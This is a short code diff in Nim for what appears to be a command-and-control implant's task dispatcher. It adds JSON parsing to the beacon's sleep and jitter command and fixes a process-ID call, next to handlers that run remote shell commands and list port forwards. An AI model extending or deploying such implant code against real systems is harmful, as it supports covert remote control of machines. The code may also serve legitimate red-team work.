@@ -2004,11 +2004,18 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
     t.sendResult(id, runShell(args), "")
 
   of "SLEEP":
-    let parts = args.split(' ')
-    if parts.len >= 1:
-      try: sleepSecDyn = parseInt(parts[0]) except: discard
-    if parts.len >= 2:
-      try: jitterDyn = parseInt(parts[1]) except: discard
+    if args.strip().startsWith("{"):
+      try:
+        let j = parseJson(args)
+        sleepSecDyn = j{"sec"}.getInt(sleepSecDyn)
+        jitterDyn = j{"jitter"}.getInt(jitterDyn)
+      except: discard
+    else:
+      let parts = args.splitWhitespace()
+      if parts.len >= 1:
+        try: sleepSecDyn = parseInt(parts[0]) except: discard
+      if parts.len >= 2:
+        try: jitterDyn = parseInt(parts[1]) except: discard
     t.sendResult(id, "[+] sleep updated", "")
 
   of "SYSINFO":
@@ -3472,8 +3479,7 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
     when defined(windows):
       t.sendResult(id, $GetCurrentProcessId(), "")
     else:
-      import std/posix
-      t.sendResult(id, $getpid(), "")
+      t.sendResult(id, $posixLib.getpid(), "")
 
   of "PORTFWD_LIST":
     t.sendResult(id, portfwdList(), "")
